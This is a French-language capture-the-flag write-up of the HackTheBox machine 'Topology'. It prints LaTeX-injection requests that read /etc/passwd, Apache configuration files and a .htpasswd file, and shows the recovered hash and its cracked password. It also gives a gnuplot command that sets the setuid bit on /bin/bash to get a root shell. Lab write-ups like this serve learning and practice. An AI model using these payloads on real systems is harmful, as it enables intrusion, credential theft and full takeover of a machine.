---
title:  "HacktheBox WriteUp : Topology"
category: HackTheBox
tag: writeups
---

### Scanner le réseau

`sudo nmap 10.10.11.217 -sV -O`

- \-sV Tente de déterminer la version du service fonctionnant sur le port
- \-O Os Fingerprinting

Après analyse du site, on voit un outil permettant de transformer du code Latex en image sur le lien `http://latex.topology.htb/equation.php`.


SCREENSHOT

En interceptant la requête, on voit que l'on peut manipuler le paramètre `eqn` sur le lien suivant :
```HTTP
GET /equation.php?eqn=\frac{x+5}{y-3}&submit= HTTP/1.1
```

En cherchant sur [hacktricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection), on voit que l'on peut faire des injections Latex.

On en vient à trouver une parload qui permet de lire le contenu de `/etc/passwd`.

```HTTP
GET /equation.php?eqn=$\lstinputlisting{/etc/passwd}$&submit= HTTP/1.1
```

SCREENSHOT

Après lecture de quelques documentations sur apache (voir ref), et tentatives non fructueuses comme la suivante :
```HTTP
GET /equation.php?eqn=$\lstinputlisting{/var/www/html/.htpasswd}$&submit= HTTP/1.1
```

On analyses quelques fichiers de configuration d'apache2.
```console
$\lstinputlisting{/etc/apache2/apache2.conf}$
$\lstinputlisting{/etc/apache2/envvars}$
$\lstinputlisting{/var/run/apache2/apache2.pid}$
$\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
```
On voit l'existence de 2 hosts virtuels : 
- dev.topology.htb 
- stats.topology.htb

Un fichier pour stocker les credentials sous apache est `htpasswd`.

On essaye donc sur les 2 hosts virtuels que l'on vient de découvrir.
```HTTP
GET /equation.php?eqn=$\lstinputlisting{/var/www/dev/.htpasswd}$&submit= HTTP/1.1
```
ce qui nous permet d'obtenir un couple de credentials.

SCREENSHOT

vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

### Crackage de mdp
```console 
john --wordlist=/tmp/rockyou.txt pass.txt
```
On obtient le pass `calculus20`.

## Foothold
On se rappelle qu'il y avait un service ssh sur la box en question.
On utilise donc  les credentials `vdaisley:calculus20` obtenus lors de l'étape précédente.
On affiche le fichier `user.txt` du dossier courant.

## Escalade de privilège

On regarde les logiciels installés sur la machine parmi les suivants, d'après la [source](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
 :
```console
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```



SCREENSHOT ll

Au vu des permissions accordées, et de la possibilité d'exploiter `gnuplot` dans cet [article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/?source=post_page-----1e4cf07d7805--------------------------------)



En mettant un sticky-bit au fichier `/bin/bash`, on peut obtenir un shell root :

```console
echo "system 'chmod u+s /bin/bash'" > /opt/gnuplot/hacked.plt
```

### Ref
- Latex Injection :
https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection
- Apache : 
  - https://utho.com/docs/tutorial/how-to-change-apache2-web-folder-in-ubuntu/
  - https://httpd.apache.org/docs/2.4/sections.html
  - https://docs.tibco.com/pub/api-exchange-gateway/2.2.0/doc/html/GUID-2A245B48-8CFA-418B-962F-14EDB642BE74.html
- Utilisation of john
https://security.stackexchange.com/questions/232139/john-format-md5-caused-unknown-ciphertext-format-name-requested-error



